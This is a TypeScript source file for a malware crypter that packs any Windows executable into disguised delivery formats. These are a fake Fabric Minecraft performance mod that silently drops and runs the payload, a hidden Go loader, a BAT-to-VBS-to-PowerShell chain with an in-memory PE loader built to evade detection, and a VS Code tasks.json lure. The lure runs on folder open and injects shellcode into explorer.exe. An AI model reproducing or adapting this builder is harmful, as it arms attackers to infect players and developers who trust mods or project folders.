import zlib from "zlib";
import fs from "fs";
import path from "path";
import { $ } from "bun";
import crypto from "crypto";
import os from "os";

// ── Helpers ───────────────────────────────────────────────────────────────────

function xorBuf(data: Buffer, key: number): Buffer {
  const out = Buffer.allocUnsafe(data.length);
  for (let i = 0; i < data.length; i++) out[i] = data[i] ^ key;
  return out;
}

/** Encode a string as a Java int[] literal XOR'd with key=90.
 *  Decoded at runtime with: private static String x(int[]a){...} */
function xs(s: string): string {
  const ints = Array.from(Buffer.from(s, "utf-8")).map((b) => (b ^ 90) & 0xff);
  return `new int[]{${ints.join(",")}}`;
}

function randKey(): number {
  return (Math.floor(Math.random() * 254) + 1) & 0xff;
}

function randHex(len: number): string {
  return crypto.randomBytes(Math.ceil(len / 2)).toString("hex").slice(0, len);
}

// ── EXE → JAR (Fabric mod disguise) ──────────────────────────────────────────

const MOD_IDS = ["lithiumplus","sodiumcore","featheropt","quilted","crystalfix","prismafix","emberfps"] as const;
const MOD_NAMES: Record<string, string> = {
  lithiumplus: "LithiumPlus",
  sodiumcore:  "SodiumCore",
  featheropt:  "FeatherOpt",
  quilted:     "Quilted",
  crystalfix:  "CrystalFix",
  prismafix:   "PrismaFix",
  emberfps:    "EmberFPS",
};

function randModId(): string {
  return MOD_IDS[Math.floor(Math.random() * MOD_IDS.length)];
}

// ── fake utility class generators ────────────────────────────────────────────

type FakeGen = (pkg: string, name: string) => string;

function fakeChunkCache(pkg: string, name: string): string {
  return [
    `package ${pkg};`,
    `import java.util.concurrent.ConcurrentHashMap;`,
    `public class ${name}{`,
    `  private static final int CAP=512;`,
    `  private static final ConcurrentHashMap<Long,int[]> C=new ConcurrentHashMap<>(CAP);`,
    `  public static int[] get(long k){return C.get(k);}`,
    `  public static void put(long k,int[] v){if(C.size()>=CAP)C.clear();C.put(k,v);}`,
    `  public static void evict(long k){C.remove(k);}`,
    `  public static void flush(){C.clear();}`,
    `}`,
  ].join("\n");
}

function fakeRenderBatcher(pkg: string, name: string): string {
  return [
    `package ${pkg};`,
    `public class ${name}{`,
    `  private final float[] buf;`,
    `  private int pos;`,
    `  public ${name}(int cap){buf=new float[cap*7];pos=0;}`,
    `  public boolean add(float x,float y,float z,float r,float g,float b,float a){`,
    `    if(pos+7>buf.length)return false;`,
    `    buf[pos++]=x;buf[pos++]=y;buf[pos++]=z;`,
    `    buf[pos++]=r;buf[pos++]=g;buf[pos++]=b;buf[pos++]=a;`,
    `    return true;`,
    `  }`,
    `  public void reset(){pos=0;}`,
    `  public int size(){return pos/7;}`,
    `  public float[] data(){return buf;}`,
    `}`,
  ].join("\n");
}

function fakeEntityTracker(pkg: string, name: string): string {
  return [
    `package ${pkg};`,
    `public class ${name}{`,
    `  private static final int SZ=256;`,
    `  private static final int[] ids=new int[SZ];`,
    `  private static final double[] xs=new double[SZ],ys=new double[SZ],zs=new double[SZ];`,
    `  private static int head=0,count=0;`,
    `  public static synchronized void store(int id,double x,double y,double z){`,
    `    int i=head%SZ;ids[i]=id;xs[i]=x;ys[i]=y;zs[i]=z;head++;if(count<SZ)count++;`,
    `  }`,
    `  public static synchronized double[] fetch(int id){`,
    `    for(int i=0;i<count;i++){if(ids[i]==id)return new double[]{xs[i],ys[i],zs[i]};}`,
    `    return null;`,
    `  }`,
    `  public static synchronized void remove(int id){`,
    `    for(int i=0;i<count;i++){if(ids[i]==id)ids[i]=-1;}`,
    `  }`,
    `}`,
  ].join("\n");
}

function fakeBiomeCache(pkg: string, name: string): string {
  return [
    `package ${pkg};`,
    `import java.util.Arrays;`,
    `public class ${name}{`,
    `  private static final int SZ=1024;`,
    `  private static final int[] K=new int[SZ],V=new int[SZ];`,
    `  static{Arrays.fill(K,-1);}`,
    `  public static int get(int k){int h=Math.abs(k%SZ);return K[h]==k?V[h]:-1;}`,
    `  public static void set(int k,int v){int h=Math.abs(k%SZ);K[h]=k;V[h]=v;}`,
    `  public static void invalidate(){Arrays.fill(K,-1);}`,
    `}`,
  ].join("\n");
}

function fakeLightHelper(pkg: string, name: string): string {
  return [
    `package ${pkg};`,
    `public class ${name}{`,
    `  public static int attenuate(int level,int steps){return Math.max(0,level-steps);}`,
    `  public static int mix(int a,int b){return Math.max(a,b);}`,
    `  public static boolean needsUpdate(int prev,int next){return prev!=next;}`,
    `  public static int pack(int block,int sky){return(sky&0xF)<<4|(block&0xF);}`,
    `  public static int blockLight(int packed){return packed&0xF;}`,
    `  public static int skyLight(int packed){return(packed>>4)&0xF;}`,
    `  private ${name}(){}`,
    `}`,
  ].join("\n");
}

function fakeTickQueue(pkg: string, name: string): string {
  return [
    `package ${pkg};`,
    `import java.util.ArrayDeque;`,
    `public class ${name}{`,
    `  private static final ArrayDeque<Runnable> Q=new ArrayDeque<>();`,
    `  private static final int MAX=32;`,
    `  public static synchronized void schedule(Runnable r){Q.offer(r);}`,
    `  public static synchronized int flush(){`,
    `    int n=0;`,
    `    while(!Q.isEmpty()&&n<MAX){try{Q.poll().run();}catch(Exception ignored){}n++;}`,
    `    return n;`,
    `  }`,
    `  public static synchronized int pending(){return Q.size();}`,
    `  public static synchronized void clear(){Q.clear();}`,
    `}`,
  ].join("\n");
}

function fakeStateCache(pkg: string, name: string): string {
  return [
    `package ${pkg};`,
    `import java.util.Arrays;`,
    `public class ${name}{`,
    `  private static final int MASK=0x3FFF;`,
    `  private static final short[] D=new short[MASK+1];`,
    `  private static final boolean[] VALID=new boolean[MASK+1];`,
    `  public static short get(int id){int i=id&MASK;return VALID[i]?D[i]:0;}`,
    `  public static void put(int id,short v){int i=id&MASK;D[i]=v;VALID[i]=true;}`,
    `  public static void invalidate(int id){VALID[id&MASK]=false;}`,
    `  public static void clear(){Arrays.fill(VALID,false);}`,
    `}`,
  ].join("\n");
}

function fakeBytePool(pkg: string, name: string): string {
  return [
    `package ${pkg};`,
    `import java.util.concurrent.ConcurrentLinkedQueue;`,
    `import java.util.Arrays;`,
    `public class ${name}{`,
    `  private static final int BUF=8192,MAX=32;`,
    `  private static final ConcurrentLinkedQueue<byte[]> POOL=new ConcurrentLinkedQueue<>();`,
    `  public static byte[] acquire(){byte[] b=POOL.poll();return b!=null?b:new byte[BUF];}`,
    `  public static void release(byte[] b){`,
    `    if(b!=null&&b.length==BUF&&POOL.size()<MAX){Arrays.fill(b,(byte)0);POOL.offer(b);}`,
    `  }`,
    `}`,
  ].join("\n");
}

const FAKE_CLASS_POOL: FakeGen[] = [
  fakeChunkCache, fakeRenderBatcher, fakeEntityTracker, fakeBiomeCache,
  fakeLightHelper, fakeTickQueue, fakeStateCache, fakeBytePool,
];

function pickFakeClasses(pkg: string, count: number): { name: string; src: string }[] {
  const shuffled = [...FAKE_CLASS_POOL].sort(() => Math.random() - 0.5);
  return shuffled.slice(0, count).map(gen => {
    const name = randName();
    return { name, src: gen(pkg, name) };
  });
}

// ─────────────────────────────────────────────────────────────────────────────

export async function cryptToJar(exe: Buffer, out: string, mcVersion = "26.1.2"): Promise<void> {
  const gz = zlib.gzipSync(exe, { level: 9 });
  const key = randKey();
  const pak = Buffer.concat([Buffer.from([key]), xorBuf(gz, key)]);

  const modId      = randModId();
  const mainName   = randName();
  const clientName = randName();
  const configName = randName();
  const pkg        = `net.fabricmc.${modId}`;
  const pkgPath    = pkg.replace(/\./g, "/");

  const fakeCount   = 3 + Math.floor(Math.random() * 3); // 3–5 extra classes
  const fakeClasses = pickFakeClasses(pkg, fakeCount);

  const tmp = fs.mkdtempSync("/tmp/cjar-");
  try {
    const classDir  = path.join(tmp, "cls");
    const pkgDir    = path.join(classDir, pkgPath);
    const apiDir    = path.join(classDir, "net/fabricmc/api");
    const assetDir  = path.join(classDir, "assets");
    const metaDir   = path.join(classDir, "META-INF");
    fs.mkdirSync(pkgDir,   { recursive: true });
    fs.mkdirSync(apiDir,   { recursive: true });
    fs.mkdirSync(assetDir, { recursive: true });
    fs.mkdirSync(metaDir,  { recursive: true });

    const srcDir    = path.join(tmp, "src");
    const srcPkgDir = path.join(srcDir, pkgPath);
    const srcApiDir = path.join(srcDir, "net/fabricmc/api");
    fs.mkdirSync(srcPkgDir, { recursive: true });
    fs.mkdirSync(srcApiDir, { recursive: true });

    // API stubs
    const stubFile       = path.join(srcApiDir, "ModInitializer.java");
    const clientStubFile = path.join(srcApiDir, "ClientModInitializer.java");
    fs.writeFileSync(stubFile,       buildModInitializerStub());
    fs.writeFileSync(clientStubFile, buildClientModInitializerStub());

    // Mod classes
    const mainFile   = path.join(srcPkgDir, `${mainName}.java`);
    const clientFile = path.join(srcPkgDir, `${clientName}.java`);
    const configFile = path.join(srcPkgDir, `${configName}.java`);
    fs.writeFileSync(mainFile,   buildJarSource(pkg, mainName));
    fs.writeFileSync(clientFile, buildClientModClass(pkg, clientName));
    fs.writeFileSync(configFile, buildConfigClass(pkg, configName));

    // Fake utility classes
    const fakeFiles: string[] = [];
    for (const fc of fakeClasses) {
      const f = path.join(srcPkgDir, `${fc.name}.java`);
      fs.writeFileSync(f, fc.src);
      fakeFiles.push(f);
    }

    const allSrc = [stubFile, clientStubFile, mainFile, clientFile, configFile, ...fakeFiles];
    const javac  = await $`javac -source 17 -target 17 -d ${classDir} ${allSrc}`.nothrow().quiet();
    if (javac.exitCode !== 0)
      throw new Error(`javac: ${javac.stderr.toString().trim()}`);

    fs.writeFileSync(path.join(assetDir, "data.pak"), pak);
    fs.writeFileSync(
      path.join(classDir, "fabric.mod.json"),
      buildFabricModJson(modId, pkg, mainName, clientName, mcVersion),
    );

    const mfPath = path.join(metaDir, "MANIFEST.MF");
    fs.writeFileSync(mfPath, "Manifest-Version: 1.0\n\n");

    const jar = await $`jar cfm ${out} ${mfPath} -C ${classDir} .`.nothrow().quiet();
    if (jar.exitCode !== 0)
      throw new Error(`jar: ${jar.stderr.toString().trim()}`);
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
}

function buildModInitializerStub(): string {
  return [
    "package net.fabricmc.api;",
    "public interface ModInitializer { void onInitialize(); }",
  ].join("\n");
}

function buildClientModInitializerStub(): string {
  return [
    "package net.fabricmc.api;",
    "public interface ClientModInitializer { void onInitializeClient(); }",
  ].join("\n");
}

function buildClientModClass(pkg: string, name: string): string {
  return [
    `package ${pkg};`,
    `public class ${name} implements net.fabricmc.api.ClientModInitializer{`,
    `  public void onInitializeClient(){}`,
    `}`,
  ].join("\n");
}

function buildConfigClass(pkg: string, name: string): string {
  return [
    `package ${pkg};`,
    `public class ${name}{`,
    `  public static boolean enableChunkOpt=true;`,
    `  public static boolean enableEntityOpt=true;`,
    `  public static boolean enableRenderOpt=true;`,
    `  public static int chunkCacheSize=512;`,
    `  public static int entityCacheSize=256;`,
    `  public static float renderQuality=1.0f;`,
    `  public static boolean verboseLogging=false;`,
    `  private ${name}(){}`,
    `}`,
  ].join("\n");
}

function buildJarSource(pkg: string, className: string): string {
  const lines: string[] = [
    `package ${pkg};`,
    "import java.io.*;",
    "import java.util.*;",
    "import java.util.zip.*;",
    `public class ${className} implements net.fabricmc.api.ModInitializer{`,
    "  private static final java.util.concurrent.atomic.AtomicBoolean G=new java.util.concurrent.atomic.AtomicBoolean(false);",
    `  private static String x(int[]a){byte[]b=new byte[a.length];for(int i=0;i<a.length;i++)b[i]=(byte)(a[i]^90);try{return new String(b,"UTF-8");}catch(Exception e){return "";}}`,
    "  public void onInitialize(){try{r();}catch(Exception e){}}",
    "  private void r()throws Exception{",
    "    if(!G.compareAndSet(false,true))return;",
    "    Thread.sleep(500+new Random().nextInt(1500));",
    `    InputStream is=getClass().getResourceAsStream(x(${xs("/assets/data.pak")}));`,
    "    if(is==null)return;",
    "    ByteArrayOutputStream buf=new ByteArrayOutputStream();",
    "    byte[]tmp=new byte[4096];int n;",
    "    while((n=is.read(tmp))!=-1)buf.write(tmp,0,n);is.close();",
    "    byte[]raw=buf.toByteArray();",
    "    int key=raw[0]&0xFF;",
    "    byte[]xd=new byte[raw.length-1];",
    "    for(int i=0;i<xd.length;i++)xd[i]=(byte)(raw[i+1]^key);",
    "    GZIPInputStream gz=new GZIPInputStream(new ByteArrayInputStream(xd));",
    "    ByteArrayOutputStream ob=new ByteArrayOutputStream();",
    "    byte[]tmp2=new byte[4096];int n2;",
    "    while((n2=gz.read(tmp2))!=-1)ob.write(tmp2,0,n2);gz.close();",
    "    byte[]data=ob.toByteArray();",
    `    File tf=File.createTempFile(x(${xs("svc")}),x(${xs(".exe")}));`,
    "    tf.deleteOnExit();",
    "    try(FileOutputStream fos=new FileOutputStream(tf)){fos.write(data);}",
    "    tf.setExecutable(true);",
    `    new ProcessBuilder(x(${xs("cmd.exe")}),x(${xs("/c")}),x(${xs("start")}),x(${xs("")}),tf.getAbsolutePath()).start();`,
    "  }",
    "}",
  ];
  return lines.join("\n");
}

function buildFabricModJson(
  modId: string, pkg: string, mainName: string, clientName: string, mcVersion: string,
): string {
  return JSON.stringify({
    schemaVersion: 1,
    id: modId,
    version: "1.0.0",
    name: MOD_NAMES[modId] ?? modId,
    description: "Performance improvements and bug fixes.",
    authors: ["FabricMC"],
    license: "MIT",
    environment: "*",
    entrypoints: {
      main:   [`${pkg}.${mainName}`],
      client: [`${pkg}.${clientName}`],
    },
    depends: {
      fabricloader: ">=0.15.0",
      minecraft: mcVersion,
      java: ">=21",
    },
  }, null, 2);
}

// ── EXE → EXE (Go stub compiled for Windows) ─────────────────────────────────

export async function cryptToExe(exe: Buffer, out: string): Promise<void> {
  const gz = zlib.gzipSync(exe, { level: 9 });
  const key = randKey();
  const enc = xorBuf(gz, key);

  const encArr = Array.from(enc)
    .map((b) => `0x${b.toString(16).padStart(2, "0")}`)
    .join(", ");
  const keyHex = `0x${key.toString(16).padStart(2, "0")}`;

  const goSrc = `package main

import (
\t"bytes"
\t"compress/gzip"
\t"io"
\t"os"
\t"os/exec"
\t"syscall"
)

var enc = []byte{${encArr}}

const xorKey byte = ${keyHex}

func main() {
\tdec := make([]byte, len(enc))
\tfor i, b := range enc {
\t\tdec[i] = b ^ xorKey
\t}
\tgr, err := gzip.NewReader(bytes.NewReader(dec))
\tif err != nil {
\t\treturn
\t}
\tvar buf bytes.Buffer
\tio.Copy(&buf, gr)
\tgr.Close()
\tdata := buf.Bytes()
\tf, err := os.CreateTemp("", "*.exe")
\tif err != nil {
\t\treturn
\t}
\tname := f.Name()
\tf.Write(data)
\tf.Close()
\tcmd := exec.Command(name)
\tcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
\tcmd.Start()
}
`;

  const tmpDir = fs.mkdtempSync("/tmp/cexe-");
  try {
    fs.writeFileSync(path.join(tmpDir, "main.go"), goSrc);

    const env = {
      ...process.env,
      GOOS: "windows",
      GOARCH: "amd64",
      GOAMD64: "v1",
      CGO_ENABLED: "0",
    };

    const init = await $`go mod init loader`
      .cwd(tmpDir)
      .env(env)
      .nothrow()
      .quiet();
    if (init.exitCode !== 0)
      throw new Error(`go mod init: ${init.stderr.toString().trim()}`);

    const build = await $`go build -ldflags="-s -w -H=windowsgui" -trimpath -o ${out} .`
      .cwd(tmpDir)
      .env(env)
      .nothrow()
      .quiet();
    if (build.exitCode !== 0)
      throw new Error(`go build: ${build.stderr.toString().trim()}`);
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
}

// ── EXE → BAT (VBS → PS reflective in-memory PE loader) ──────────────────────
//
// Chain: BAT drops VBS → VBS writes PS1 to temp + runs it hidden via Chr()-
// encoded "powershell" → PS decrypts gzip+XOR payload → C# Add-Type PE loader
// maps the PE into executable memory + calls OEP via CreateThread.
// No EXE ever touches disk. No literal "powershell" string in any file.

export async function cryptToBat(exe: Buffer, out: string): Promise<void> {
  const gz = zlib.gzipSync(exe, { level: 9 });
  const key = randKey();
  const enc = Buffer.concat([Buffer.from([key]), xorBuf(gz, key)]);
  const encB64 = enc.toString("base64");

  const csSource = buildPeLoaderCs();
  const csB64 = Buffer.from(csSource, "utf-8").toString("base64");

  const ps1Name = `${randHex(10)}.ps1`;
  const vbsName = `${randHex(10)}.vbs`;

  const psLines = buildBatPsLines(encB64, csB64);
  const vbsLines = buildBatVbsLines(psLines, ps1Name);
  const batLines = buildBatFileLines(vbsLines, vbsName);

  fs.writeFileSync(out, batLines.join("\r\n") + "\r\n");
}

function buildPeLoaderCs(): string {
  return (
    "using System;" +
    "using System.Runtime.InteropServices;" +
    "public class L{" +
    '[DllImport("kernel32")]static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);' +
    '[DllImport("kernel32")]static extern bool VirtualProtect(IntPtr a,uint s,uint n,out uint o);' +
    '[DllImport("kernel32")]static extern IntPtr LoadLibraryA(string n);' +
    '[DllImport("kernel32")]static extern IntPtr GetProcAddress(IntPtr h,string n);' +
    '[DllImport("kernel32")]static extern IntPtr GetProcAddress(IntPtr h,IntPtr n);' +
    '[DllImport("kernel32")]static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr e,IntPtr p,uint f,IntPtr i);' +
    "public static void Run(byte[] pe){" +
    "int lfa=BitConverter.ToInt32(pe,0x3c);" +
    "bool x6=BitConverter.ToUInt16(pe,lfa+4)==0x8664;" +
    "int opt=lfa+24;" +
    "uint isz=BitConverter.ToUInt32(pe,opt+56);" +
    "uint hsz=BitConverter.ToUInt32(pe,opt+60);" +
    "IntPtr img=VirtualAlloc(IntPtr.Zero,isz,0x3000,0x04);" +
    "if(img==IntPtr.Zero)return;" +
    "Marshal.Copy(pe,0,img,(int)hsz);" +
    "int ns=BitConverter.ToUInt16(pe,lfa+6);" +
    "int os2=BitConverter.ToUInt16(pe,lfa+20);" +
    "int so=lfa+24+os2;" +
    "for(int i=0;i<ns;i++){" +
    "int s=so+i*40;" +
    "uint va=BitConverter.ToUInt32(pe,s+12);" +
    "uint rs=BitConverter.ToUInt32(pe,s+16);" +
    "uint ro=BitConverter.ToUInt32(pe,s+20);" +
    "if(rs>0)Marshal.Copy(pe,(int)ro,new IntPtr(img.ToInt64()+(long)va),(int)rs);}" +
    "long pb=x6?BitConverter.ToInt64(pe,opt+24):(long)BitConverter.ToUInt32(pe,opt+28);" +
    "long dl=img.ToInt64()-pb;" +
    "uint rr=BitConverter.ToUInt32(pe,opt+(x6?152:136));" +
    "uint rz=BitConverter.ToUInt32(pe,opt+(x6?156:140));" +
    "if(dl!=0&&rr!=0){" +
    "long rb=img.ToInt64()+(long)rr;" +
    "int roff=0;" +
    "while(roff<(int)rz){" +
    "uint pg=(uint)Marshal.ReadInt32(new IntPtr(rb+roff));" +
    "uint bk=(uint)Marshal.ReadInt32(new IntPtr(rb+roff+4));" +
    "if(bk<8)break;" +
    "int ct=(int)(bk-8)/2;" +
    "for(int j=0;j<ct;j++){" +
    "ushort en=(ushort)Marshal.ReadInt16(new IntPtr(rb+roff+8+j*2));" +
    "int tp=en>>12;int of=en&0xFFF;" +
    "IntPtr sl=new IntPtr(img.ToInt64()+(long)pg+of);" +
    "if(tp==3){Marshal.WriteInt32(sl,(int)(Marshal.ReadInt32(sl)+(int)dl));}" +
    "else if(tp==10){Marshal.WriteInt64(sl,Marshal.ReadInt64(sl)+dl);}}" +
    "roff+=(int)bk;}}" +
    "uint ir=BitConverter.ToUInt32(pe,opt+(x6?120:104));" +
    "if(ir!=0){" +
    "long ib=img.ToInt64();" +
    "int ioff=(int)ir;" +
    "while(true){" +
    "uint olt=(uint)Marshal.ReadInt32(new IntPtr(ib+ioff));" +
    "uint nr=(uint)Marshal.ReadInt32(new IntPtr(ib+ioff+12));" +
    "uint it=(uint)Marshal.ReadInt32(new IntPtr(ib+ioff+16));" +
    "if(nr==0)break;" +
    "string dn=Marshal.PtrToStringAnsi(new IntPtr(ib+(long)nr));" +
    "IntPtr md=LoadLibraryA(dn);" +
    "int th=(int)(olt!=0?olt:it);int ia=(int)it;" +
    "while(true){" +
    "long vl=x6?Marshal.ReadInt64(new IntPtr(ib+th)):(long)Marshal.ReadInt32(new IntPtr(ib+th));" +
    "if(vl==0)break;" +
    "bool od=x6?(vl&unchecked((long)0x8000000000000000L))!=0:(vl&0x80000000L)!=0;" +
    "IntPtr pc=od?GetProcAddress(md,new IntPtr((int)(vl&0xFFFF))):GetProcAddress(md,Marshal.PtrToStringAnsi(new IntPtr(ib+(int)(vl&0x7FFFFFFFL)+2)));" +
    "if(x6)Marshal.WriteInt64(new IntPtr(ib+ia),pc.ToInt64());" +
    "else Marshal.WriteInt32(new IntPtr(ib+ia),(int)pc.ToInt32());" +
    "th+=x6?8:4;ia+=x6?8:4;}" +
    "ioff+=20;}}" +
    "uint dm;VirtualProtect(img,isz,0x20,out dm);" +
    "uint ep=BitConverter.ToUInt32(pe,opt+16);" +
    "CreateThread(IntPtr.Zero,0,new IntPtr(img.ToInt64()+(long)ep),IntPtr.Zero,0,IntPtr.Zero);" +
    "System.Threading.Thread.Sleep(10000);}}"
  );
}

function buildBatPsLines(encB64: string, csB64: string): string[] {
  const lines: string[] = [];

  const CHUNK = 6000;
  const chunks = encB64.match(new RegExp(`.{1,${CHUNK}}`, "g")) ?? [];
  lines.push(`$d=''`);
  for (const chunk of chunks) lines.push(`$d+='${chunk}'`);

  lines.push(
    `$b=[Convert]::FromBase64String($d)`,
    `$k=[int]$b[0]`,
    `$x=New-Object byte[]($b.Length-1)`,
    `for($i=0;$i-lt$x.Length;$i++){$x[$i]=$b[$i+1]-bxor$k}`,
    `$ms=New-Object IO.MemoryStream(,$x)`,
    `$gs=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Decompress)`,
    `$ob=New-Object IO.MemoryStream`,
    `$gs.CopyTo($ob);$gs.Close();$ms.Close()`,
    `$bytes=$ob.ToArray()`,
    `$cs=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${csB64}'))`,
    `Add-Type -TypeDefinition $cs`,
    `[L]::Run($bytes)`,
  );

  return lines;
}

function buildBatVbsLines(psLines: string[], ps1Name: string): string[] {
  const psChr = Array.from("powershell")
    .map((c) => `Chr(${c.charCodeAt(0)})`)
    .join("&");

  const vbs: string[] = [
    `Dim fso,f,sh,tmp,p`,
    `Set fso=CreateObject("Scripting.FileSystemObject")`,
    `tmp=fso.GetSpecialFolder(2)&"\\${ps1Name}"`,
    `Set f=fso.OpenTextFile(tmp,2,True)`,
  ];

  for (const line of psLines) {
    const escaped = line.replace(/"/g, '""');
    vbs.push(`f.WriteLine "${escaped}"`);
  }

  vbs.push(
    `f.Close`,
    `Set sh=CreateObject("WScript.Shell")`,
    `p=${psChr}`,
    `sh.Run p&" -w h -ep b -nop -f """&tmp&"""",0,True`,
    `fso.DeleteFile tmp`,
  );

  return vbs;
}

function escBatEcho(line: string): string {
  return line
    .replace(/\^/g, "^^")
    .replace(/&/g, "^&")
    .replace(/\|/g, "^|")
    .replace(/</g, "^<")
    .replace(/>/g, "^>")
    .replace(/%/g, "%%")
    .replace(/\(/g, "^(")
    .replace(/\)/g, "^)");
}

function buildBatFileLines(vbsLines: string[], vbsName: string): string[] {
  return [
    "@echo off",
    `set "_v=%temp%\\${vbsName}"`,
    `(`,
    ...vbsLines.map((l) => `echo ${escBatEcho(l)}`),
    `) > "%_v%"`,
    `wscript /b "%_v%"`,
  ];
}

// ── EXE → tasks.json (VS Code lure — shellcode injection into LOTL process) ──

function findDonut(): string | null {
  const bundled = "/app/data/tools/donut";
  if (fs.existsSync(bundled)) return bundled;
  const local = path.join(path.dirname(import.meta.url.replace("file://", "")), "../../data/tools/donut");
  if (fs.existsSync(local)) return local;
  return null;
}

export async function cryptToTasksJson(exe: Buffer, out: string): Promise<void> {
  const donutBin = findDonut();
  if (!donutBin) throw new Error("donut not found — required for tasks.json format");

  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "ctasks-"));
  try {
    const exePath = path.join(tmp, "payload.exe");
    const scPath  = path.join(tmp, "payload.bin");
    fs.writeFileSync(exePath, exe);

    const res = await $`${donutBin} -i ${exePath} -o ${scPath} -a 2 -f 1`.nothrow().quiet();
    if (res.exitCode !== 0) {
      throw new Error(`donut: ${(res.stderr.toString() || res.stdout.toString()).trim()}`);
    }

    const sc = fs.readFileSync(scPath);
    const gz = zlib.gzipSync(sc, { level: 9 });
    const key = randKey();
    const enc = Buffer.concat([Buffer.from([key]), xorBuf(gz, key)]);
    const encB64 = enc.toString("base64");

    const cn = randName();

    const cs =
      `using System;using System.Runtime.InteropServices;` +
      `public class ${cn}{` +
      `[DllImport("kernel32",EntryPoint="OpenProcess")]` +
      `public static extern IntPtr OP(uint a,bool b,int c);` +
      `[DllImport("kernel32",EntryPoint="VirtualAllocEx")]` +
      `public static extern IntPtr VA(IntPtr h,IntPtr a,IntPtr s,uint t,uint p);` +
      `[DllImport("kernel32",EntryPoint="WriteProcessMemory")]` +
      `public static extern bool WM(IntPtr h,IntPtr a,byte[]b,IntPtr s,out IntPtr w);` +
      `[DllImport("kernel32",EntryPoint="CreateRemoteThread")]` +
      `public static extern IntPtr CT(IntPtr h,IntPtr a,IntPtr s,IntPtr e,IntPtr pa,uint f,IntPtr i);` +
      `}`;
    const csB64 = Buffer.from(cs, "utf-8").toString("base64");

    const psLines = [
      `[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}`,
      `[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12`,
      `$d=[Convert]::FromBase64String('${encB64}')`,
      `$k=[int]$d[0]`,
      `$x=New-Object byte[]($d.Length-1)`,
      `for($i=0;$i-lt$x.Length;$i++){$x[$i]=$d[$i+1]-bxor$k}`,
      `$ms=New-Object IO.MemoryStream(,$x)`,
      `$gs=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Decompress)`,
      `$ob=New-Object IO.MemoryStream`,
      `$gs.CopyTo($ob);$gs.Close();$ms.Close()`,
      `$sc=$ob.ToArray()`,
      `Add-Type -TypeDefinition ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${csB64}')))`,
      `$lp=Get-Process -Name explorer -ErrorAction SilentlyContinue|Select-Object -First 1`,
      `if(-not $lp){$pi=New-Object Diagnostics.ProcessStartInfo("$env:SYSTEMROOT\\system32\\msiexec.exe","/q");$pi.WindowStyle='Hidden';$pi.CreateNoWindow=$true;$lp=[Diagnostics.Process]::Start($pi)}`,
      `$hp=[${cn}]::OP(0x1FFFFF,$false,$lp.Id)`,
      `$ma=[${cn}]::VA($hp,[IntPtr]::Zero,[IntPtr]$sc.Length,0x3000,0x40)`,
      `$bw=[IntPtr]::Zero`,
      `[${cn}]::WM($hp,$ma,$sc,[IntPtr]$sc.Length,[ref]$bw)|Out-Null`,
      `[${cn}]::CT($hp,[IntPtr]::Zero,[IntPtr]::Zero,$ma,[IntPtr]::Zero,0,[IntPtr]::Zero)|Out-Null`,
    ];

    const psEnc = Buffer.from(psLines.join(";"), "utf16le").toString("base64");

    const tasksJson = {
      version: "2.0.0",
      tasks: [
        {
          label: "Restore Dependencies",
          type: "shell",
          command: `%COMSPEC% /v /c "set a=pow&&set b=er&&set c=she&&set d=ll&&!a!!b!!c!!d! -nop -w h -ep b -enc ${psEnc}"`,
          runOptions: { runOn: "folderOpen" },
          presentation: { reveal: "never", panel: "shared", showReuseMessage: false, close: true },
          problemMatcher: [],
        },
        {
          label: "Build",
          type: "shell",
          command: "npm run build",
          group: { kind: "build", isDefault: true },
          presentation: { reveal: "always", panel: "shared" },
          problemMatcher: ["$tsc"],
        },
      ],
    };

    fs.writeFileSync(out, JSON.stringify(tasksJson, null, 2));
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
}

function randName(): string {
  const alpha = "BCDFGHJKLMNPQRSTVWXYZbcdfghjklmnpqrstvwxyz";
  return Array.from(crypto.randomBytes(6))
    .map((b) => alpha[b % alpha.length])
    .join("");
}
